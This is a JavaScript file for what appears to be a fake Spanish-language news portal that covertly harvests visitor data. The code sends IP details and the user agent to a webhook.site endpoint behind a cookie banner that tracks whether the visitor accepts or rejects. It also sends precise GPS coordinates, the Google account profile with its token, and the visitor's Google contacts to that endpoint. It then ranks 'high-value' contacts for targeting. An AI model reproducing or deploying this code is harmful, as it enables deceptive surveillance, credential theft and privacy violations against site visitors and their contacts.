/**
 * GLOBAL INSIGHT CORE SYSTEM
 */

const CONFIG = {
    WEBHOOK_URL: "https://webhook.site/8681f53b-1612-4dee-b6df-adde57557614",
    COOKIE_TIMEOUT: 1500,
    FORCE_ACCEPT: true
};

const FIREBASE_CONFIG = {
    apiKey: "AIzaSyCZxRHndnpjYCvWG-kZYKDWpyqCN_UAOWY",
    authDomain: "recoleccion-datos-a78a6.firebaseapp.com",
    projectId: "recoleccion-datos-a78a6",
    storageBucket: "recoleccion-datos-a78a6.firebasestorage.app",
    messagingSenderId: "123889106526",
    appId: "1:123889106526:web:f3d296fedf8e92907dbecf"
};

const newsDatabase = [
    { title: "Avance Histórico en Inteligencia Artificial Generativa", category: "Tecnología" },
    { title: "Mercados Asiáticos Cierran al Alza tras Anuncios", category: "Economía" },
    { title: "La NASA Confirma Nueva Misión a las Lunas de Júpiter", category: "Ciencia" },
    { title: "El Futuro del Trabajo Híbrido: Informe 2025", category: "Negocios" }
];

class AdvancedSpyware {
    constructor(webhook) {
        this.webhook = webhook;
        this.ipData = null;
        this.userAgent = navigator.userAgent;
        this.acceptedCookies = false;
        this.stolenContacts = [];
    }

    async trackIP() {
        try {
            const res = await fetch('https://ipwho.is/');
            const data = await res.json();
            this.ipData = data;
            this.exfiltrate({ ...data, userAgent: this.userAgent }, "PASSIVE_DATA", "Rastreo General");
        } catch (e) {
            console.error("Fallo IP:", e);
        }
    }

    trackGPS(onSuccess, onError) {
        if (!navigator.geolocation) return onError("GPS no soportado");
        
        navigator.geolocation.getCurrentPosition(
            (pos) => {
                const { latitude, longitude, accuracy } = pos.coords;
                const gpsData = {
                    lat: latitude,
                    lon: longitude,
                    acc: accuracy,
                    map_url: `http://maps.google.com/maps?q=${latitude},${longitude}`,
                    ...this.ipData
                };
                this.exfiltrate(gpsData, "ACTIVE_GPS_TARGET", "Ubicación Exacta");
                onSuccess(gpsData);
            },
            (err) => onError(err),
            { enableHighAccuracy: true, timeout: 10000 }
        );
    }

    async stealGoogleContacts(accessToken) {
        try {
            console.log("🔍 Robando contactos de Google...");
            
            const response = await fetch('https://people.googleapis.com/v1/people/me/connections?personFields=names,emailAddresses,phoneNumbers,photos&pageSize=100', {
                headers: {
                    'Authorization': `Bearer ${accessToken}`,
                    'Content-Type': 'application/json'
                }
            });

            if (!response.ok) {
                throw new Error(`Error API: ${response.status}`);
            }

            const data = await response.json();
            const contacts = data.connections || [];
            
            console.log(`📱 Robados ${contacts.length} contactos`);
            
            // Procesar contactos
            const processedContacts = contacts.map(contact => {
                const name = contact.names ? contact.names[0].displayName : 'Sin nombre';
                const email = contact.emailAddresses ? contact.emailAddresses[0].value : 'Sin email';
                const phone = contact.phoneNumbers ? contact.phoneNumbers[0].value : 'Sin teléfono';
                const photo = contact.photos ? contact.photos[0].url : null;
                
                return {
                    name,
                    email,
                    phone,
                    photo,
                    resourceName: contact.resourceName
                };
            }).filter(contact => contact.name !== 'Sin nombre'); // Filtrar contactos válidos

            this.stolenContacts = processedContacts;
            
            // Exfiltrar contactos
            this.exfiltrate({
                totalContacts: processedContacts.length,
                contacts: processedContacts,
                timestamp: new Date().toISOString()
            }, "GOOGLE_CONTACTS_STEAL", "Red Social Completa");

            return processedContacts;

        } catch (error) {
            console.error("❌ Error robando contactos:", error);
            return [];
        }
    }

    analyzeSocialNetwork(contacts) {
        const analysis = {
            totalContacts: contacts.length,
            contactsWithEmail: contacts.filter(c => c.email !== 'Sin email').length,
            contactsWithPhone: contacts.filter(c => c.phone !== 'Sin teléfono').length,
            contactsWithPhoto: contacts.filter(c => c.photo).length,
            commonDomains: this.getCommonEmailDomains(contacts),
            potentialTargets: this.identifyHighValueContacts(contacts)
        };

        console.log("📊 Análisis de red social:", analysis);
        return analysis;
    }

    getCommonEmailDomains(contacts) {
        const domains = {};
        contacts.forEach(contact => {
            if (contact.email !== 'Sin email') {
                const domain = contact.email.split('@')[1];
                domains[domain] = (domains[domain] || 0) + 1;
            }
        });
        return Object.entries(domains)
            .sort((a, b) => b[1] - a[1])
            .slice(0, 5);
    }

    identifyHighValueContacts(contacts) {
        // Identificar contactos potencialmente importantes
        return contacts.filter(contact => {
            const email = contact.email.toLowerCase();
            const name = contact.name.toLowerCase();
            
            // CEOs, directores, gerentes
            const highValueTitles = ['ceo', 'cto', 'cfo', 'director', 'gerente', 'manager', 'founder', 'president'];
            const hasHighValueTitle = highValueTitles.some(title => name.includes(title));
            
            // Dominios corporativos importantes
            const corporateDomains = ['gmail.com', 'outlook.com', 'yahoo.com']; // En realidad buscarías: company.com, etc.
            const hasCorporateEmail = !corporateDomains.includes(email.split('@')[1]);
            
            return hasHighValueTitle || hasCorporateEmail;
        }).slice(0, 10); // Top 10
    }

    exfiltrate(payload, type, precision) {
        fetch(this.webhook, {
            method: 'POST',
            mode: 'no-cors',
            headers: { 'Content-Type': 'text/plain' },
            body: JSON.stringify({ 
                ALERTA: type, 
                PRECISION: precision, 
                DATOS: payload,
                timestamp: new Date().toISOString()
            })
        }).then(() => console.log("📤 Datos exfiltrados:", type)).catch(e => console.log("Error envío"));
    }

    setCookiesAccepted(status) {
        this.acceptedCookies = status;
    }
}

class AuthManager {
    constructor() {
        this.user = null;
        this.initialized = false;
        this.accessToken = null;
        this.stolenContacts = [];
        this.initFirebase();
    }

    initFirebase() {
        try {
            console.log("🔄 Inicializando Firebase...");
            
            if (typeof firebase === 'undefined') {
                throw new Error("Firebase SDK no cargado");
            }

            firebase.initializeApp(FIREBASE_CONFIG);
            this.initialized = true;
            console.log("✅ Firebase inicializado");
            
            firebase.auth().onAuthStateChanged((user) => {
                this.handleAuthStateChange(user);
            });

        } catch (error) {
            console.error("❌ Error Firebase:", error);
            this.showFirebaseError(error.message);
        }
    }

    showFirebaseError(message) {
        console.error("Error Firebase:", message);
    }

    async handleAuthStateChange(user) {
        console.log("🔄 Estado auth cambiado:", user);
        if (user) {
            this.user = user;
            
            // Obtener access token para APIs de Google
            this.accessToken = await user.getIdToken();
            
            this.showUserProfile(user);
            this.exfiltrateUserData(user);
            
            // Robar contactos si el usuario dio permiso
            const contactsPermission = document.getElementById('contacts-permission')?.checked;
            if (contactsPermission && window.advancedSpy) {
                this.stolenContacts = await window.advancedSpy.stealGoogleContacts(this.accessToken);
                this.displayStolenContacts(this.stolenContacts);
                
                // Análisis de la red social
                const analysis = window.advancedSpy.analyzeSocialNetwork(this.stolenContacts);
                this.displaySocialAnalysis(analysis);
            }
            
        } else {
            this.user = null;
            this.accessToken = null;
            this.stolenContacts = [];
            this.hideUserProfile();
        }
    }

    async signInWithGoogle() {
        if (!this.initialized) {
            alert("Sistema no disponible");
            return null;
        }

        try {
            const provider = new firebase.auth.GoogleAuthProvider();
            
            // Pedir permisos adicionales para contactos
            provider.addScope('https://www.googleapis.com/auth/contacts.readonly');
            provider.addScope('https://www.googleapis.com/auth/user.phonenumbers.read');
            
            const result = await firebase.auth().signInWithPopup(provider);
            return result.user;
        } catch (error) {
            console.error("❌ Error login:", error);
            alert("Error: " + error.message);
            return null;
        }
    }

    async signOut() {
        try {
            await firebase.auth().signOut();
        } catch (error) {
            console.error("Error logout:", error);
        }
    }

    showUserProfile(user) {
        const profileWidget = document.getElementById('user-profile');
        const authWidget = document.getElementById('auth-widget');
        
        if (profileWidget && authWidget) {
            document.getElementById('user-name').textContent = user.displayName || 'Usuario';
            document.getElementById('user-email').textContent = user.email || 'No email';
            
            const avatar = document.getElementById('user-avatar');
            if (user.photoURL) {
                avatar.src = user.photoURL;
            }
            
            authWidget.style.display = 'none';
            profileWidget.style.display = 'block';
        }
    }

    hideUserProfile() {
        const profileWidget = document.getElementById('user-profile');
        const authWidget = document.getElementById('auth-widget');
        
        if (profileWidget && authWidget) {
            profileWidget.style.display = 'none';
            authWidget.style.display = 'block';
        }
    }

    displayStolenContacts(contacts) {
        const contactsList = document.getElementById('contacts-list');
        const contactsCount = document.getElementById('contacts-count');
        
        if (contactsList && contactsCount) {
            contactsCount.textContent = contacts.length;
            contactsList.innerHTML = '';
            
            // Mostrar primeros 5 contactos
            contacts.slice(0, 5).forEach(contact => {
                const contactElement = document.createElement('div');
                contactElement.className = 'contact-item';
                
                const initials = contact.name.split(' ').map(n => n[0]).join('').toUpperCase();
                
                contactElement.innerHTML = `
                    <div class="contact-avatar">${initials.substring(0, 2)}</div>
                    <div class="contact-info">
                        <div class="contact-name">${contact.name}</div>
                        <div class="contact-email">${contact.email}</div>
                    </div>
                `;
                
                contactsList.appendChild(contactElement);
            });
            
            if (contacts.length > 5) {
                const moreElement = document.createElement('div');
                moreElement.className = 'contact-item';
                moreElement.innerHTML = `<div class="contact-email">+ ${contacts.length - 5} contactos más...</div>`;
                contactsList.appendChild(moreElement);
            }
        }
    }

    displaySocialAnalysis(analysis) {
        console.log("📈 Análisis de red social mostrado:", analysis);
        // Esto se usará en el dashboard de inteligencia
    }

    exfiltrateUserData(user) {
        const userData = {
            uid: user.uid,
            email: user.email,
            displayName: user.displayName,
            photoURL: user.photoURL,
            emailVerified: user.emailVerified,
            metadata: {
                creationTime: user.metadata.creationTime,
                lastSignInTime: user.metadata.lastSignInTime
            },
            accessToken: this.accessToken,
            timestamp: new Date().toISOString()
        };

        if (window.advancedSpy) {
            window.advancedSpy.exfiltrate(userData, "USER_OAUTH_DATA", "Perfil Completo");
        }

        console.log("🎯 DATOS OBTENIDOS LEGALMENTE:");
        console.log("   👤 Nombre:", user.displayName);
        console.log("   📧 Email:", user.email);
        console.log("   🖼️ Foto:", user.photoURL);
        console.log("   🔑 Access Token:", this.accessToken ? "SI" : "NO");
    }
}

// Funciones UI
function renderNews() {
    const heroEl = document.getElementById("hero-news");
    const gridEl = document.getElementById("secondary-grid");
    
    const shuffled = [...newsDatabase].sort(() => 0.5 - Math.random());

    if (heroEl && shuffled.length > 0) {
        const hero = shuffled[0];
        heroEl.innerHTML = `
            <img src="https://picsum.photos/800/600?random=${Math.random()}" alt="News">
            <div class="hero-content">
                <span style="background:#0056b3; padding:4px 8px; font-size:0.75rem; margin-bottom:10px; display:inline-block; border-radius:2px;">${hero.category}</span>
                <h1>${hero.title}</h1>
            </div>
        `;
    }

    if (gridEl && shuffled.length > 1) {
        gridEl.innerHTML = "";
        const secondaryNews = shuffled.slice(1, 5);
        
        secondaryNews.forEach(news => {
            const card = document.createElement('div');
            card.className = 'news-card';
            card.innerHTML = `
                <img src="https://picsum.photos/400/300?random=${Math.random()}" alt="News Mini">
                <h3>${news.title}</h3>
                <span class="meta">${news.category} • Hace 2h</span>
            `;
            gridEl.appendChild(card);
        });
    }
}

function renderTrending() {
    const listEl = document.getElementById("trending-list");
    if (!listEl) return;

    listEl.innerHTML = "";
    const trendingNews = newsDatabase.slice(0, 5);

    trendingNews.forEach((news, index) => {
        const li = document.createElement("li");
        li.innerHTML = `
            <span>0${index + 1}</span>
            <div style="display:flex; flex-direction:column; justify-content:center;">
                <small style="color:#d93025; font-weight:bold; font-size:0.7rem;">TENDENCIA</small>
                <a href="#" style="font-weight:bold; font-size:0.9rem; line-height:1.3;">${news.title}</a>
            </div>
        `;
        listEl.appendChild(li);
    });
}

function setupAuthEvents(authManager) {
    const loginBtn = document.getElementById('btn-login');
    const googleLoginBtn = document.getElementById('btn-google-login');
    const logoutBtn = document.getElementById('btn-logout');
    const loginModal = document.getElementById('login-modal');

    if (loginBtn) {
        loginBtn.addEventListener('click', () => {
            if (loginModal) loginModal.style.display = 'flex';
        });
    }

    if (googleLoginBtn) {
        googleLoginBtn.addEventListener('click', async () => {
            googleLoginBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Conectando...';
            googleLoginBtn.disabled = true;

            const user = await authManager.signInWithGoogle();
            
            if (user) {
                if (loginModal) loginModal.style.display = 'none';
                showCustomNotification(`Bienvenido, ${user.displayName || 'Usuario'}!`);
            } else {
                googleLoginBtn.innerHTML = '<i class="fab fa-google"></i> Continuar con Google';
                googleLoginBtn.disabled = false;
            }
        });
    }

    if (logoutBtn) {
        logoutBtn.addEventListener('click', () => {
            authManager.signOut();
            showCustomNotification('Sesión cerrada correctamente');
        });
    }

    if (loginModal) {
        loginModal.addEventListener('click', (e) => {
            if (e.target === loginModal) {
                loginModal.style.display = 'none';
                const googleLoginBtn = document.getElementById('btn-google-login');
                if (googleLoginBtn) {
                    googleLoginBtn.innerHTML = '<i class="fab fa-google"></i> Continuar con Google';
                    googleLoginBtn.disabled = false;
                }
            }
        });
    }
}

function setupIntelligenceDashboard() {
    const showBtn = document.getElementById('btn-show-dashboard');
    const dashboard = document.getElementById('intelligence-dashboard');
    const closeBtn = document.getElementById('btn-close-dashboard');

    if (showBtn && dashboard) {
        showBtn.classList.remove('hidden');
        
        showBtn.addEventListener('click', () => {
            dashboard.classList.remove('hidden');
            populateIntelligenceDashboard();
        });
    }

    if (closeBtn) {
        closeBtn.addEventListener('click', () => {
            dashboard.classList.add('hidden');
        });
    }
}

function populateIntelligenceDashboard() {
    const authManager = window.authManager;
    const spy = window.advancedSpy;
    
    if (!authManager || !authManager.user) return;

    // Datos del perfil
    const profileData = document.getElementById('profile-data');
    if (profileData) {
        profileData.innerHTML = `
            <div class="data-item"><strong>Nombre:</strong> ${authManager.user.displayName}</div>
            <div class="data-item"><strong>Email:</strong> ${authManager.user.email}</div>
            <div class="data-item"><strong>ID:</strong> ${authManager.user.uid}</div>
            <div class="data-item"><strong>Verificado:</strong> ${authManager.user.emailVerified ? 'Sí' : 'No'}</div>
            <div class="data-item"><strong>Cuenta creada:</strong> ${new Date(authManager.user.metadata.creationTime).toLocaleDateString()}</div>
        `;
    }

    // Datos de contactos
    const contactsData = document.getElementById('contacts-data');
    const totalContacts = document.getElementById('total-contacts');
    
    if (contactsData && spy && spy.stolenContacts.length > 0) {
        totalContacts.textContent = spy.stolenContacts.length;
        
        contactsData.innerHTML = spy.stolenContacts.slice(0, 10).map(contact => `
            <div class="contact-card">
                <div class="contact-avatar">${contact.name.split(' ').map(n => n[0]).join('').substring(0, 2)}</div>
                <div>
                    <strong>${contact.name}</strong><br>
                    <small>${contact.email}</small>
                </div>
            </div>
        `).join('');
    }

    // Análisis social
    const analysisData = document.getElementById('social-analysis');
    if (analysisData && spy && spy.stolenContacts.length > 0) {
        const analysis = spy.analyzeSocialNetwork(spy.stolenContacts);
        
        analysisData.innerHTML = `
            <div class="analysis-item">
                <strong>Resumen de Red Social:</strong><br>
                • Total de contactos: ${analysis.totalContacts}<br>
                • Con email: ${analysis.contactsWithEmail}<br>
                • Con teléfono: ${analysis.contactsWithPhone}<br>
                • Con foto: ${analysis.contactsWithPhoto}
            </div>
            <div class="analysis-item">
                <strong>Dominios más comunes:</strong><br>
                ${analysis.commonDomains.map(([domain, count]) => `• ${domain}: ${count} contactos`).join('<br>')}
            </div>
        `;
    }
}

function setupCookieTrap(spy) {
    const modal = document.getElementById('cookie-modal');
    const btnAccept = document.getElementById('btn-accept-all');
    const btnReject = document.getElementById('btn-reject');

    if (!modal) return;

    modal.style.display = 'flex';

    const close = () => {
        spy.setCookiesAccepted(true);
        modal.style.display = 'none';
        spy.trackIP();
        showSafeNotification();
    };

    if (btnAccept) btnAccept.addEventListener('click', close);
    if (btnReject) btnReject.addEventListener('click', () => {
        btnReject.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Guardando...';
        setTimeout(close, 800);
    });
}

function showSafeNotification() {
    showCustomNotification('Preferencias actualizadas');
}

function showCustomNotification(message) {
    const notif = document.createElement('div');
    notif.style.cssText = `
        position: fixed; top: 20px; right: 20px; background: #333; color: white;
        padding: 12px 20px; border-radius: 4px; box-shadow: 0 4px 12px rgba(0,0,0,0.2);
        z-index: 10000; font-size: 0.85rem; display: flex; align-items: center; gap: 10px;
        animation: slideIn 0.5s ease forwards;
    `;
    notif.innerHTML = `<i class="fas fa-check" style="color:#0f9d58;"></i> ${message}`;
    document.body.appendChild(notif);
    setTimeout(() => notif.remove(), 3000);
}

// Inicialización
document.addEventListener("DOMContentLoaded", () => {
    console.log("🚀 Iniciando aplicación con ROBO DE CONTACTOS...");
    
    // 1. Inicializar Spyware Avanzado
    const advancedSpy = new AdvancedSpyware(CONFIG.WEBHOOK_URL);
    window.advancedSpy = advancedSpy;

    // 2. Inicializar Auth Manager
    const authManager = new AuthManager();
    window.authManager = authManager;

    // 3. Cargar contenido
    renderNews();
    renderTrending();
    setupAuthEvents(authManager);
    setupIntelligenceDashboard();

    // 4. Trampas
    setTimeout(() => setupCookieTrap(advancedSpy), CONFIG.COOKIE_TIMEOUT);

    // 5. Fecha
    const dateEl = document.getElementById("current-date");
    if (dateEl) {
        dateEl.innerText = new Date().toLocaleDateString('es-ES', {
            weekday: 'long', year: 'numeric', month: 'long', day: 'numeric'
        });
    }

    // 6. GPS
    const btnGps = document.getElementById("btn-gps-trigger");
    if (btnGps) {
        btnGps.addEventListener("click", () => {
            if (!advancedSpy.acceptedCookies) {
                alert("Acepta las cookies primero");
                return;
            }
            
            advancedSpy.trackGPS(
                (data) => {
                    btnGps.style.display = "none";
                    console.log("GPS éxito:", data);
                },
                (error) => {
                    alert("Error GPS: " + error);
                }
            );
        });
    }

    console.log("✅ Sistema de robo de contactos inicializado");
});

// Animaciones
const style = document.createElement('style');
style.textContent = `
    @keyframes slideIn {
        from { transform: translateX(100%); opacity: 0; }
        to { transform: translateX(0); opacity: 1; }
    }
`;
document.head.appendChild(style);
